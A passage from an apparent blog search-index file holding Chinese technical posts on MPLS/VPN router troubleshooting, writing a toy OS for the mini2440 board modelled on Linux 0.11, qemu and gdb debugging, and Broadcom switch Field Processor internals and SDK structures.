vrf VPN-HW redistribute connected redistribute static no synchronization exit-address-family address-family vpnv4 neighbor 10.5.80.240 activate exit-address-family 调试命令 一、查看VPN的路由 PE3_NE16#show ip route vrf VPN-HW VPN-HW Route Information Routing Table: VPN-HW RD: 65400:1 Destination/Mask Proto Pre Metric Nexthop Interface 1.1.1.1/32 BGP 170 0 220.163.42.62 LoopBack0 192.168.20.0/29 BGP 170 0 220.163.42.62 LoopBack0 192.168.20.0/30 BGP 170 0 220.163.42.62 LoopBack0 192.168.20.65/32 DIRECT 0 0 127.0.0.1 InLoopBack0 192.168.20.96/29 DIRECT 0 0 192.168.20.101 GE4/1/0.2 192.168.20.101/32 DIRECT 0 0 127.0.0.1 InLoopBack0 对于路由表中的BGP路由，下一跳地址是对端PE的loopback地址，出接口则是自己的loopback接口。 二、查看BGP的VPN路由 PE3_NE16#show ip bgp vpnv4 all BGP local router ID is 220.163.42.126 Status codes: s suppressed, d damped, h history, * valid, &gt; best, i internal Origin codes: i - IGP, e - EGP, ? - incomplete Network Next Hop Label(I/O) Metric LocPrf Path Route Distinguisher:65400:1 (default for vrf vpna) *&gt;i 1.1.1.1/32 220.163.42.62 0/17 100 ? *&gt;i 192.168.20.0/29 220.163.42.62 0/17 100 ? *&gt;i 192.168.20.0/30 220.163.42.62 0/16 100 ? *&gt; 192.168.20.65/32 0.0.0.0 19/0 ? *&gt; 192.168.20.96/29 0.0.0.0 18/0 ? 此命令用来查看BGP学习到的VPNv4路由的具体信息，以及私网标签的分配情况。特别是本地始发的路由（next hop 0.0.0.0）的标签分配情况，只能通过本命令查看。 三、查看私网标签命令 PE3_NE16#show mpls lsp vrf brief ID I/O-Label In-Interface Prefix/Mask Next-Hop 1 —/141|17 ———- 1.1.1.1/32 220.163.42.62 2 —/141|17 ———- 192.168.20.0/29 220.163.42.62 3 —/141|16 ———- 192.168.20.0/30 220.163.42.62 3 Record(s) Found 此命令只可以查看学习到的BGP路由的私网标签情况，对于本地始发的路由无法查看，必须通过命令 show ip bgp vpnv4 all查看。 四、Ping&amp;Telnet&amp;tracert 由于现在一台PE上存在多张路由表了，所有针对VPN路由的ping、telnet、tracert等常用命令，必须加上vrf参数，而且最好加上－a参数，指明源地址。 PE3_NE16#ping -vrf vpna -a 192.168.20.65 1.1.1.1 PE3_NE16#tracert -vrf vpna -a 192.168.20.65 1.1.1.1 PE3_NE16#telnet vrf vpna 1.1.1.1 Trouble shooting 一、MPLS/VPN的trouble-shooting 由于MPLS/VPN的报文转发是基于LSP，而LSP是依附于路由的。所以定位故障的思路是：先查路由、再查标签；先查私网、再查公网。 查看私网路由： 分别查看两端PE路由器的VRF中是否存在对端PE的VRF路由 命令： show ip route vrf 查看BGP邻居关系： 邻居状态机是否达到Established状态 命令：show ip bgp summary Neighbor V AS MsgRcvd MsgSent OutQ Up/Down State 220.163.42.62 4 65400 6818 6895 0 14h48m Established 查看公网路由： 是否在公网LSP途径的所有设备上都存在对端PE的loopback地址的精确路由？（必须是32位mask） 查看公网IGP配置： 是否通过IGP将PE的loopback地址的路由发布出去 为什么沿途设备上都必须是精确路由？ 查看私网标签： 查看本端PE路由器的私网标签是否为对端PE所分配，相关命令： • 本端 show mpls lsp vrf brief ID I/O-Label In-Interface Prefix/Mask Next-Hop • —/141|17 ———- 1.1.1.1/32 220.163.42.62 • 对端 show ip bgp vpnv4 all Network Next Hop Label(I/O) Metric LocPrf Path *&gt; 1.1.1.1/32 0.0.0.0 17/0 ? 查看MP-BGP配置、以及对端PE与CE之间的路由协议配置、双方的RT规则配置： address-family ipv4 vrf VPN-HW redistribute connected exit-address-family address-family vpnv4 neighbor 10.5.80.240 activate 查看BGP配置： 查看普通BGP的配置，是否正确的配置了BGP邻居。 查看私网路由的下一跳： 查看本地的公网路由表中是否存在私网路由的下一跳（即：对端PE的loopback地 址）的精确路由？（必须是32位mask） 查看公网标签： 查看整个LSP上的所有设备是否已经为两个PE的loopback地址正确的分配了 公网标签，相关命令：show mpls lsp brief 每台设备的入标签是否为其下 一跳的出标签。 ID I/O-Label In-Interface Prefix/Mask Next-Hop 22 382/264 VT20 10.5.61.250/32 10.5.3.94 查看LDP邻居： 查看两台相邻的PE或P路由器之间是否正确建立了LDPsession 相关命令：show mpls ldp session Session State: Operational 查看MPLS配置： 查看该设备是否在全局使能了MPLS，以及在相应的接口上使能了LDP。 全局命令： mpls lsr id 10.5.80.250! mpls ldp 在接口上启动LDP Session interface Ethernet4/1/0 mpls ldp enable http://down.51cto.com/data/97614","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"}],"tags":[]},{"title":"编写操作系统思路","slug":"EMBEDDED/mini2440/编写操作系统思路","date":"2019-08-29T04:27:44.162Z","updated":"2019-08-29T04:26:00.125Z","comments":true,"path":"EMBEDDED/mini2440/编写操作系统思路.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/mini2440/编写操作系统思路.html","excerpt":"计算机基本硬件：I/O接口 硬盘 内存 CPU 时钟 看门狗 ​ 内存(有可能需要考虑 MMU和cache等) ​ CPU(中断)","text":"计算机基本硬件：I/O接口 硬盘 内存 CPU 时钟 看门狗 ​ 内存(有可能需要考虑 MMU和cache等) ​ CPU(中断) 操作系统分为 两部分 ： 资源部分：以文件系统的方式呈现 调度部分：以多进程的方式呈现 操作系统说复杂也确实很复杂，但是如果从简单点的角度去看他，其实也没那么玄乎，我们先不要考虑mmu，毕竟没有mmu的情况也有好多操作系统。没有mmu就是直接内存。开始不要有内存顾虑，然后就是中断，我们自己写的库是直接调用的，而内核也算是一个库吧，只是这个库自己也在运行，并且调用方式是通过中断。 我们的大体方向为两面夹击型，其实有人问嵌入式linux怎么学，应该先从什么开始学，我理解为没有什么固定应该从那里学，从你最熟悉的部分开始学，这样好理解，你直接只会裸板开发，那你就能简单熟悉下linux命令，开始设备驱动。如果之前是应用开发，那就从你熟悉角度去理解。不管从哪个方向走，都会是条条大路通罗马。 像如果想熟悉linux kernel，我们还是最好从简单的开始，两面夹击型。我们最好有裸板经验，然后是设备驱动经验。然后再开始内核框架。我想这样最好了。 操作系统的功能： 1.管理硬件，这就是为什么linux要有设备驱动的概念。 2.程序调度，能让这个机器cpu等发挥更多的性能。 以上也是比bootloader多出的重要部分。当然为了多进程的调度更加方便和内存利用最大化，还应多出了重要器件mmu。并且，为了让进程能用到硬件，还通过中断提供了一系列系统调用。其实对应用来说内核就是一个稍微特殊点的库而已。 我们先还管不了应用，我们先把内核自己运行溜了，并且能管理起来各个硬件再说，这其实就是实现了一个简单的bootloader一样的东西。然后我们想更容易用这些硬件，我们提出了文件系统等一些概念。 大家看看内核这个程序的大致结构：这个图果然很经典。 调度部分是本内核程序控制别的程序运行功能。额，暂可把它当作内核大大的一个小功能即可。我的的思路是先把内核自己想要运转溜了，所以，就不要想先玩转别人。 貌似，这有点像我们先实现一个bootload。bootload的功能就是加载内核。而我们这个功能只是多一点而已。 我应该简单总结下bootload的编写流程，然后如果在bootload基础上添加：文件系统、进程调度等功能。实现操作系统的样子。 操作系统的发展估计也是这个样子，逐步添加小功能呗。 bootload编写流程： 熟悉板子引导流程，编写最开始的引导部分代码，最好是汇编。 初始化一些必要的硬件可以用c。有：时钟、ram、nand、串口。 编写shell。添加一些必要的命令。基本就以上这些。算是最基本的bootloader。 我们可以在以上bootloader的基础上添加例如：文件系统，内存管理、调度等功能就成为了操作系统。 有了思路就好办了， 由于操作系统比较庞大，而且要求每个模块的逻辑协作比较复杂。所以我想在实现操作的时候可以先订个小目标。例如：我先不实现调度部分，我先能实现资源部分。能够通过文件系统访问资源。 第一个小目标：在终端实现执行ls 当然，由于硬件支持用户态和内核态能，先都放下，我们只在内核态实现。 其实，如果添加用户态和内核态功能，程序在调用的时候只是利用了中断方式，但为了简单和入门。我们不走此流程。现在只是先入门并能够开始。 首先：我把硬件平台简单描述下，毕竟我们是要在一个特定的硬件实现系统。当然我们不深入讨论体系结构或是组成原理。不然我们有可能陷入另一个学科，而不是此次的实践目的了。 一个程序想要通过CPU实现执行，必须是CPU可随机访问的。我所说的内存当然满足此要求。但是内存是掉电丢失的，所以我们要把程序先放到可以掉电不丢失的硬盘上。当然不是硬盘软盘、光盘、u盘随便你喜欢什么都可以，只要能保存程序就可以了。有了以上认识，我们就可以总结出，想要运行我们的系统。必须要有cpu、内存、硬盘。 我们以s3c2440为例子，s3c2440的cpu为arm920，内存为外置sdram， 硬盘为nand 当然用到的硬件肯定不止这些，但是我们可以用到哪些了解哪些就可以了。 以上为最基本硬件信息， 但是我们还需要有个输入输出、不然怎么操作我们的系统 ，呵呵。 说到输入输出，又想提一下串口和文件系统， 因为我们想通过串口操作我们的系统，但是我们又不想太low，直接操作硬件，不然我们要操作系统干什么，而linux是一切皆文件的思想，文件的体现方式为文件系统实现的。所以还是有必要提一下文件系统。 我们先以read/write来入手，层层剥开文件系统的面纱。 因为想要 write 的实现原理以下为write定义 lib目录下 - 用户系统接口 write.c1_syscall3(int,write,int,fd,const char *,buf,off_t,count) unistd.h123456789101112#define _syscall3(type,name,atype,a,btype,b,ctype,c) \\type name(atype a,btype b,ctype c) \\&#123; \\long __res; \\__asm__ volatile (\"int $0x80\" \\ : \"=a\" (__res) \\ : \"0\" (__NR_##name),\"b\" ((long)(a)),\"c\" ((long)(b)),\"d\" ((long)(c))); \\if (__res&gt;=0) \\ return (type) __res; \\errno=-__res; \\return -1; \\&#125; 从以上可以看出wirte是通过80中断到内核的，内核通过以下处理 kernel目录下 - 内核中断处理 set_system_gate(0x80,&amp;system_call);和system_call.s和sys_call_table[] 真正执行到：read_write.c fs目录下 - 真正调用到内核的函数 int sys_write(unsigned int fd,char * buf,int count) 可以看出，期间以上参数可以通过寄存器传递。 也完全像内核注释上所说，用户通过系统调用到了文件系统。​ 在用户态write的函数，就不用说了大家肯定已经很熟悉了，有必要说的就剩下内核终端处理部分，和文件系统实现部分了。 想要实现文件系统，根据上面的图，大家发现我们要先实现块设备。呵呵。我们又要先实现字符设备和块设备驱动程序。 字符设备先放放，我们先看看块设备。 块设备底下为nand flash，我们这个块设备要把nand flash抽象后给文件系统提供接口。","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"},{"name":"mini2440","slug":"EMBEDDED/mini2440","permalink":"http://demonelf.github.io/categories/EMBEDDED/mini2440/"}],"tags":[]},{"title":"文件系统理解","slug":"EMBEDDED/mini2440/文件系统理解","date":"2019-08-29T04:18:26.915Z","updated":"2019-08-29T04:16:02.640Z","comments":true,"path":"EMBEDDED/mini2440/文件系统理解.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/mini2440/文件系统理解.html","excerpt":"以下都是自己瞎理解，并不一定对，但会慢慢完善。 我们可以想象下，linux文件系统，是吧我们想利用的资源，以虚拟一种树状目录结构管理。最初我们主要想把，硬盘上的内容以树状的结构管理起来。但是发现，其实好多硬件都可以放到这个树中。例如：字符设备串口等。这要我们能清楚的管理硬件。简单既是美。这也是linux可能玩不了复杂的，只能简单的想到一切皆文件的理念吧。 我们先不考虑虚拟文件系统，其实虚拟文件系统只是在我们这个真实的文件系统上再虚拟一层。因为可能由于兴趣原因，我们不想在每个硬盘上都放一种真实文件，有的像放fat，有的想放ext3，有的想法minix。呵呵，有点开玩笑。由于一个电脑上有多个文件系统。我们又不想让用户用写个应用还得open_ext3 read_ext3z这个样子。所以我们又封装了以下open-&gt;open_ext3,用户还是只要调用open就可以了，所以有了虚拟文件系统。不过我们现在不想管，我们就一个文件系统minix。因为我怕乱了，额。","text":"以下都是自己瞎理解，并不一定对，但会慢慢完善。 我们可以想象下，linux文件系统，是吧我们想利用的资源，以虚拟一种树状目录结构管理。最初我们主要想把，硬盘上的内容以树状的结构管理起来。但是发现，其实好多硬件都可以放到这个树中。例如：字符设备串口等。这要我们能清楚的管理硬件。简单既是美。这也是linux可能玩不了复杂的，只能简单的想到一切皆文件的理念吧。 我们先不考虑虚拟文件系统，其实虚拟文件系统只是在我们这个真实的文件系统上再虚拟一层。因为可能由于兴趣原因，我们不想在每个硬盘上都放一种真实文件，有的像放fat，有的想放ext3，有的想法minix。呵呵，有点开玩笑。由于一个电脑上有多个文件系统。我们又不想让用户用写个应用还得open_ext3 read_ext3z这个样子。所以我们又封装了以下open-&gt;open_ext3,用户还是只要调用open就可以了，所以有了虚拟文件系统。不过我们现在不想管，我们就一个文件系统minix。因为我怕乱了，额。 还是以上经典图： 下面minix文件系统在硬盘上的结构 超级块用于存放盘设备上文件系统结构信息 i节点存放着文件系统中文件或目录名的索引节点，每个文件或目录都有一个i节点。 逻辑块位图用于描述盘上每个数据盘款的使用情况。 i节点位图用于说明i节点是否被使用。 int bmap(struct m_inode * inode,int block) bmap实现了以上i节点和超级块的关联。 namei也是利用bmap解析文件系统中树目录结构 下面你会发现namei处在什么位置。 linux下文件系统和块设备包含的一些概念： 主设备号：blk_dev[NR_BLK_DEV] 从设备号： 通过blk_dev[MAJOR_NR].request_fn = DEVICE_REQUEST;注册void do_hd_request(void)功能 看看linux 0.11是怎么通过read调用到硬盘上的。 调用流程12345678910111213141516171819应用| read-&gt;中断Vread_write.c----------------文件系统上层接口-----------------| sys_readVfs/block_dev.c--------------文件系统下层/块设备接口-----------| block_readVfs/buffer.c | breadaVblk_drv/ll_rw_blk.c---------块设备/设备驱动上层接口----------| ll_rw_block-&gt;make_request-&gt;add_request-&gt;request_fn| -&gt;do_hd_requestVkernel/blk_drv/hd.c---------设备驱动底层接口----------------| do_hd_requestV 每个任务都有一个自己的task_struct current;current中包含了任务打开的文件fd。struct file filp[NR_OPEN]; open.copen|Vopen_namei次函数是操作文件系统树目录的重要体现接口。 open_namei返回的是struct m_inode12345678910111213141516171819202122struct m_inode &#123; unsigned short i_mode; unsigned short i_uid; unsigned long i_size; unsigned long i_mtime; unsigned char i_gid; unsigned char i_nlinks; unsigned short i_zone[9];/* these are in memory also */ struct task_struct * i_wait; unsigned long i_atime; unsigned long i_ctime; unsigned short i_dev; unsigned short i_num; unsigned short i_count; unsigned char i_lock; unsigned char i_dirt; unsigned char i_pipe; unsigned char i_mount; unsigned char i_seek; unsigned char i_update;&#125;; 123456789101112131415161718192021struct super_block &#123; unsigned short s_ninodes; unsigned short s_nzones; unsigned short s_imap_blocks; unsigned short s_zmap_blocks; unsigned short s_firstdatazone; unsigned short s_log_zone_size; unsigned long s_max_size; unsigned short s_magic;/* These are only in memory */ struct buffer_head * s_imap[8]; struct buffer_head * s_zmap[8]; unsigned short s_dev; struct m_inode * s_isup; struct m_inode * s_imount; unsigned long s_time; struct task_struct * s_wait; unsigned char s_lock; unsigned char s_rd_only; unsigned char s_dirt;&#125;;","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"},{"name":"mini2440","slug":"EMBEDDED/mini2440","permalink":"http://demonelf.github.io/categories/EMBEDDED/mini2440/"}],"tags":[]},{"title":"qemu模拟mini2440调试手册","slug":"EMBEDDED/mini2440/qemu模拟mini2440调试手册","date":"2019-08-29T04:18:26.899Z","updated":"2019-08-29T04:15:56.472Z","comments":true,"path":"EMBEDDED/mini2440/qemu模拟mini2440调试手册.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/mini2440/qemu模拟mini2440调试手册.html","excerpt":"前情提要 最近想在mini2440上模仿linux 0.12的代码实现arm版本的linux。一来是想巩固下arm，在就是学习下操作系统的相关只是。哎、最后之前的想法非常幼稚，心想学就学最新，当时想看懂linux 3.x的版本。没想到越看越老，从3.x到2.x, 再到0.12 呵。我想真把 0.12 玩的非常通其实也不是件易事。从硬件到系统，mmu到进程，等等。如何有机的组在一起运行起来，也是很费精力。 废话不多说，学习的环境为，gentoo + qemu_mini2440.","text":"前情提要 最近想在mini2440上模仿linux 0.12的代码实现arm版本的linux。一来是想巩固下arm，在就是学习下操作系统的相关只是。哎、最后之前的想法非常幼稚，心想学就学最新，当时想看懂linux 3.x的版本。没想到越看越老，从3.x到2.x, 再到0.12 呵。我想真把 0.12 玩的非常通其实也不是件易事。从硬件到系统，mmu到进程，等等。如何有机的组在一起运行起来，也是很费精力。 废话不多说，学习的环境为，gentoo + qemu_mini2440. 说实话如果你条件方便，还是买个板子吧， 因为学操作系统和硬件非常相关。而qemu虚拟只是模拟出用到的基本功能，和真实的硬件环境确实相差不少。例如，在真是环境中，mini2440 的启动方式为，sd 或nand 到 stepping stone,然后再纠结的到sdram。但是到了qemu你就醉了，它是直接把代码拷贝到sdram的。你说你是不很闹心。玩起来是不并不是随心所欲了 呵呵。 发现此问题是通过gdb调试发现。 在此顺便记下qemu_gdb方法： qemu启动： qemu-system-arm -M mini2440 -m 256m -mtdblock mini2440_nand128.bin -serial stdio -nographic -gdb tcp::1234 -S gdb启动： gdb1234567(gdb) file vmlinux(gdb) target remote :1234(gdb) b start_kernel(gdb) c(gdb) x /200xb 0x004013ce //以十六进制查看内存(gdb) x /10i main //以汇编的方式查看内存(gdb) disassemble main //等同上面","categories":[{"name":"EMBEDDED","slug":"EMBEDDED","permalink":"http://demonelf.github.io/categories/EMBEDDED/"},{"name":"mini2440","slug":"EMBEDDED/mini2440","permalink":"http://demonelf.github.io/categories/EMBEDDED/mini2440/"}],"tags":[]},{"title":"BCM芯片FP原理及相关SDK数据结构介绍","slug":"EMBEDDED/BCM芯片FP原理及相关SDK数据结构介绍","date":"2019-08-29T04:18:26.899Z","updated":"2019-08-29T04:16:45.181Z","comments":true,"path":"EMBEDDED/BCM芯片FP原理及相关SDK数据结构介绍.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/BCM芯片FP原理及相关SDK数据结构介绍.html","excerpt":"作者: 北京—小武 邮箱：night_elf1020@163.com","text":"作者: 北京—小武 邮箱：night_elf1020@163.com 新浪微博：北京-小武 BCM芯片有几个大的模块： VLAN、L2、L3和FP等几个，其中FP的使用也最为灵活，能解析匹配数据包文的前128字节比特级的内容，动作包括转发、丢弃、结合qos修改相应字段、分配vid、流镜像、流重定向、指定端口转发（比如CPU口）、指定下一跳转发往、指定隧道转发等，往往在实现功能上有意想不到的功效。简单来说，如果硬件和BSP分别是九阳真经和九阴真经的话，那么port和vlan是少林七十二项绝技的组合，L2转发则是显得有点悠闲的峨眉派功夫，当然L3则是以太极拳为代表的武当派功夫，那么FP可以是以乾坤大挪移、吸星大法等为代表的魔教的邪而又邪的”旁门左道”，当然其他功能是零零散散的其他门派功夫。能够灵活运用好FP是增加很多交换机新功能的一种常用的手段。本文总结下FP这个模块BCM在硬件上的实现原理及SDK的相关数据结构。因为FP在实现功能上的灵活性，在此希望能抛砖引玉，激发大家更多的应用FP实现新功能的火花。 BCM芯片FP实现原理 FP的全称是Fields Processors，也称为ContentAwareProcess（CAP），在BCM较早的芯片称为Fast Filter Processors（FFP），和现在的FP相比有一些原理不同，不过现在交换芯片已经不再使用FFP，所以在此也不再介绍。FP本质来说，是一组相互之间有关联的表，一起通过查找、匹配等来决定对报文施加的动作；在BCM芯片交换机中，有三种查找查找方式：hash，index，tcam。FP的查找主要用到了index和tcam，其中CAM的全称是ContentAddressable Memory，中文是内容寻址器，TCAM则是Ternary ContentAddressable Memory，中文称为三态内存寻址器，TCAM的实现是通过对应比特位+掩码产生三种匹配方式：掩码为0表示不关心、掩码为1且对应位为1或掩码为1且对应位为0。 这就是三态的具体含义。 在我们自研交换机所用的芯片中有三个FP：VFP(VLAN FP)、IFP（ingres FP）和EFP（Egress FP），另外在四代芯片kylin卡中曾出现外扩FP，称为E-IFP，表项大小为128K，为L2和L3转发用，有点openflow的意味。其中VFP主要用于对报文tag的处理，比如添删或修改vid的灵活QINQ的实现就基于此FP；IFP的用途比较多，主要是对进入端口后的报文进行处理，主要有入口acl、流重定向、流镜像、设置下一跳、为qos数据报文分类等用途；EFP的用途和IFP类似，但是因为EFP是报文在转出前在出端口进行处理的规则，IFP有的动作类型在EFP不太适用。虽然三种FP用途和数据包流经顺序不太一样，但是硬件原理是一致的。下面介绍下FP的硬件原理。 图1 FP原理组成图 图1中，每一个查找引擎和策略引擎及后面的counter资源和meter资源组合成一个规则组，芯片称之为一个slice，从图1可以看出，FP的实现有五部分组成： 智能解析模板：主要将报文信息（最多报文前128字节，可以精确到每一位bit）根据对每个slice的care字段将各对应字段解析出来，再加上前面L2、L3的转发信息，一起送给每个slice的查找引擎去匹配； 查找引擎：将解析出来的字段按照TCAM方式去查找本slice的规则是否有匹配的，即HIT的，只要有一条hit的即刻返回这条规则的index不再继续查找本slice后面规则，后面即使还有匹配的规则；这样做就是为了保证一个slice内部规则的优先级；如果没有匹配说明此slice没有匹配的规则或根本就没有规则，后面的流程也无需再走； 策略引擎：根据查找引擎得到的index直接索引策略引擎的动作，动作类型有转发、丢弃、重定向（包括到CPU口且可指定队列）、流镜像（包括到CPU口且可指定队列）、修改报文特定的字段（COS、DSCP、EXP等）、与后面的meter一起对报文染色并对不同染色报文指定相应动作、指定下一跳、指定ECMP、指定TTL是否修改、指定URPF的模式等相关动作；需要说明的是，一条规可以对报文执行多种动作，当然需要报文动作之间是不冲突的，即slice规则的动作冲突是靠配置下发来检查的，同一条规则有冲突的动作无法下发硬件； Counter和meter资源： counter资源用于计数，有基于byte和packet的两种方式；meter主要用于测速，然后根据速度对报文进行染色（绿、黄和红）然后对报文应用不同的QOS策略；meter的工作原理可以参见我原先写的有关令牌桶相关文档。 动作冲突决策引擎：前面说过，一条slice的动作冲突是靠配置下发检查来实现的，冲突的动作无法同时下发到硬件；但是FP通常有多个slice，每个slice都有规则被匹配且动作时间有冲突时，需要动作冲突决策引擎来处理到底执行哪一个规则的动作，如果多个动作不冲突都执行；原则是丢弃、重定向等优先级最高，其他时候看slice号（这个slice号有的芯片只支持是物理的，高级芯片支持虚拟slice号），slice号越大优先级越高； 我们一条规则的匹配报文长度信息是有限的，对于IPV4报文同时匹配SMAC、DMAC、SIP、DIP等信息的时候，就不够了，芯片提供了将两条规则合并成一条规则，组成更大长度规则的方法，主要有图2示的两种,： 图2 两种slice宽模式 第一种是将一条slice的规则分为前后两部分，然后进行如图2左边的方式拼成double模式，这种模式称为double wide模式；第二种是用两条slice，直接如图2右边所示的方式拼成double模式，这种拼接方式称之为slice-paring模式。这两种模式，有的低级芯片都不支持，只能用单倍模式，有的芯片支持其中一种，我们的redstone交换机就只支持左边的这种方式。还有的芯片可以同时支持这两种拼接方式，那么就可以利用这点拼接处具有更大长度信息的四倍模式： 图3 四倍key模式 这种模式常用于IPV6报文的匹配中，因为IPV6的SIP和DIP实在太长了，再加上匹配其他信息，只能用四倍模式才能完全覆盖所有字段。但是我们的redstone交换机只支持slice-pairng模式，所以在IPV6报文的匹配中需要做折中。 前面我们提到slice有物理slice和虚拟slice，这个与物理内存和虚拟内存有点类似，FP都有物理slice，在高级的芯片上，为了更好的解决slice之间的动作冲突，对slice进行了虚拟编号，虚拟slice号越大优先级越高，这样就可以实现动作的优先级指定；可能做过物理slice的同学能体会为了保证各种应用slice的优先级在软件处理所做的代码处理工作有多么的艰辛；硬件进步这么一步，支持虚拟slice后，这部分工作就完全交给硬件来处理了，我们只需要指定优先级高低就可以了。而且虚拟slice还支持虚拟slice组的概念，每一个虚拟slice组就像一条slice一样，只会有一个动作产生出，这样就又大大减少了动作冲突的机会，而且还能使得每种应用使用更多的slice资源，无需考虑因为物理slice带来的动作优先级打破应用的优先级，更符合实际。 BCM对FP操作的接口 BCM的SDK提供了四套对于FP资源使用和管理的函数接口，需要视具体应用环境和个人喜好来定夺，四种接口如下： SOC API：直接硬件表项或寄存器操作，BCM各种问题明确不提倡的接口，因为需要配置人员管理和组织大量的逻辑； Bcmx接口：通常不被使用的接口，因为不太灵活，且SDK被改造成为所有ACL规则为一个大的group，现在暂时IFP只有协议规则和ACL使用，所以还勉强满足需求，以lport作为端口的配置参数；但是每次下发新规则都要先删除原来规则，这个是没有必要的；这套接口和下面BCM接口的区别不是很大。相关函数接口有： bcmx_field_group_create bcmx_field_group_create_id bcmx_field_group_compress bcmx_field_group_install bcmx_field_group_remove bcmx_field_group_destroy bcmx_field_entry_create bcmx_field_entry_destroy bcmx_field_entry_destroy_all bcmx_field_data_qualifier_destroy bcmx_field_data_qualifier_destroy_all bcmx_field_qualify_clear bcmx_field_dataqualifier**_add bcmx_field_dataqualifier**_ delete等。 Bcm接口：BCM中对FP操作的最灵活的一组接口，非常适合运营商多种应用的场合，这组接口传递的参数也非常详细；相关函数接口有： bcm_field_group_create bcm_field_group_create_id bcm_field_group_priority_set bcm_field_group_compress bcm_field_group_install bcm_field_group_remove bcm_field_group_destroy bcm_field_entry_create bcm_field_entry_create_id bcm_field_entry_destroy bcm_field_entry_destroy_all bcm_field_entry_reinstall bcm_field_entry_remove bcm_field_qualify_clea bcm_fieldqualify** bcm_field_action_add bcm_field_action_delete等。 Bcma接口：这套接口称为AdvancedContentAware Enhanced Software (ACES) implementation，传递的参数为bcma_acl_t*list，以结构体形式将规则所有参数下发到硬件； / List Management functions / extern int bcma_acl_add(bcma_acl_t*list_id); extern int bcma_acl_remove(bcma_acl_list_id_tlist_id); extern int bcma_acl_get(bcma_acl_list_id_tlist_id, bcma_acl_t *list); extern intbcma_acl_rule_add(bcma_acl_list_id_t list_id, bcma_acl_rule_t*rule); extern int bcma_acl_rule_remove(bcma_acl_list_id_tlist_id, bcma_acl_rule_id_t rule_id); extern intbcma_acl_rule_get(bcma_acl_rule_id_t rule_id, bcma_acl_rule_t **rule); / Validation and Installation functions / extern int bcma_acl_install(void); extern int bcma_acl_uninstall(void); 等。 SDK对FP资源管理的相关数据结构 1. BCM芯片每一个unit都有这么一个结构体来保存芯片所有FP的资源占用情况： static _field_control_t *_field_control[BCM_MAX_NUM_UNITS]; field_control_t的具体内容为（每个变量都有详细注释，此处不再阐述）： struct _field_control_s { sal_mutex_t fc_lock; / Protectionmutex. / bcm_field_stage_t stage; / Default FP pipeline stage. / int max_stage_id; / Number of fpstages. / _field_udf_t udf; / field_status-&gt;group_total */ struct _field_group_s groups; / List of groupsin unit. */ struct_field_stage_s stages; / Pipeline stage FP info. } 2. 然后对field_control_t中的_field_group_s表示一种应用占用的slice和slice的规则记录： _field_group_s { bcm_field_group_t gid; / Opaque handle. / int priority; / Field grouppriority. / bcm_field_qset_t qset; / This group’s Qualifier Set. / uint8 flags; / Group configuration flags. / _field_slice_t slices; / Pointer intoslice array. */ bcm_pbmp_t pbmp; / Ports in use this group. / _field_sel_t sel_codes[_FP_MAX_ENTRY_WIDTH]; / Select codes forslice(s). / _bcm_field_group_qual_t qual_arr[_FP_MAX_ENTRY_WIDTH]; /* Qualifiers available in each individual entry part. */ _field_stage_id_t stage_id; / FP pipeline stage id. / } 3. 在每一个unit中还有_field_stage_s来对各种FP（VFP/IFP/EFP）的资源记录的数据结构： typedef struct _field_stage_s { _field_stage_id_t stage_id; / Pipeline stageid. / uint8 flags; / Stage flags. / int tcam_sz; / Number ofentries in TCAM. / int tcam_slices; / Number ofinternal slices. / struct_field_slice_s slices; / Array of slices.*/ } 4. 在在每一个_field_stage_s中用_field_slice_s对每一个slice资源进行记录的结构体： _field_slice_s { uint8 slice_number; / Hardware slicenumber. / int start_tcam_idx;/ Slice first entry tcam index. / int entry_count; / Number of entriesin the slice./ int free_count; / Number of freeentries. / int counters_count;/ Number of counters accessible. / int meters_count; / Number of metersaccessible. / _field_counter_bmp_t counter_bmp; / Bitmap forcounter allocation. / _field_meter_bmp_t meter_bmp; / Bitmap for meterallocation. / _field_stage_id_t stage_id; / Pipeline stageslice belongs. / bcm_pbmp_t pbmp; / Ports in use by groups. / struct _field_entry_s *entries; / List of entriespointers. */ } 5. 在在每一个_field_slice_s中用_field_entry_s对slice内部的entry进行记录： struct_field_entry_s { bcm_field_entry_t eid; / BCM unit unique entryidentifier / int prio; / Entry priority / uint32 slice_idx; / Field entry tcam index. / uint16 flags; / _FP_ENTRY_xxx flags / _field_tcam_t tcam; / Fields to be written intoFP_TCAM / _field_tcam_t extra_tcam; #ifdefined(BCM_RAPTOR_SUPPORT) || defined(BCM_TRX_SUPPORT) _field_pbmp_t pbmp; / Port bitmap / #endif /BCM_RAPTOR_SUPPORT || BCM_TRX_SUPPORT / _field_action_t actions; / linked list of actions for entry */ _field_slice_t fs; / Slice where entry lives */ _field_group_t group; / Group where entry lives */ _field_entry_stat_t statistic; / Statistics collection entity. / /Policers attached to the entry. / _field_entry_policer_tpolicer[_FP_POLICER_LEVEL_COUNT]; #ifdefined(BCM_KATANA_SUPPORT) _field_entry_policer_tglobal_meter_policer; #endif struct _field_entry_s next; / Entry lookup linked list. */ }; 上面actions 是一个_field_action_t的结构体的链表，其信息为： typedef struct_field_action_s { bcm_field_action_t action; / action type / uint32 param0; / Action specific parameter / uint32 param1; / Action specific parameter / uint8 inst_flg; / Installed Flag / struct _field_action_s *next; }_field_action_t; 6. 在SDK编码中，用UNIT号获取对应的_field_control_t信息的代码可以如下： _field_control_t *fc; BCM_IF_ERROR_RETURN(_field_control_get(unit,&amp;fc)); 7. 进而获取每一个group资源的代码可以如下： _field_group_t *fg; fg = fc-&gt;groups; while (fg != NULL) { if (fg-&gt;gid == gid) { *group_p = fg; return (BCM_E_NONE); } fg = fg-&gt;next; } 8. 获取每一个slice的资源可以如下 _field_slice_t *slices; slice =&amp;fg-&gt;slices[0]; while(slice !=NULL){ slice = slice-&gt;prev; } 9. 获取slice中规则的的资源可以如下： _field_entry_t *f_ent; _field_action_t *fa_iter; _field_entry_get(unit, entry, _FP_ENTRY_PRIMARY,&amp;f_ent);//entry fa_iter = f_ent-&gt;actions;//entry的action 